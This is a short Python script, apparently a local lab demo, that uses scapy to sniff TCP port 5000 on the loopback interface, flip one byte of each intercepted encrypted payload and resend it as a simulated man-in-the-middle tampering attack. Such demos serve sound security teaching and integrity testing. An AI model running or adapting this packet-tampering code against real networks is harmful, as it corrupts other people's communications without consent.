from scapy.all import sniff, IP, TCP, Raw, send
import os

INTERFACE = "\\Device\\NPF_Loopback"  # Using Loopback since packets are local

def modify_packet(packet):
    if packet.haslayer(Raw):  # Only modify packets with payload
        encrypted_data = packet[Raw].load
        print(f"\n🛑 [MITM] Intercepted Encrypted Data: {encrypted_data.hex()}")

        # Modify one byte in the encrypted message (simulate tampering)
        modified_data = bytearray(encrypted_data)
        modified_data[5] ^= 0xFF  # Flip a random byte

        print(f"🔴 [MITM] Tampered Data Sent: {modified_data.hex()}")

        # Send the tampered packet back to the server
        new_packet = packet.copy()
        new_packet[Raw].load = bytes(modified_data)
        send(new_packet, iface=INTERFACE)

# Start sniffing and modifying packets
print("🛑 [MITM] Attempting Data Tampering Attack...")
sniff(iface=INTERFACE, filter="tcp port 5000", prn=modify_packet, store=False)

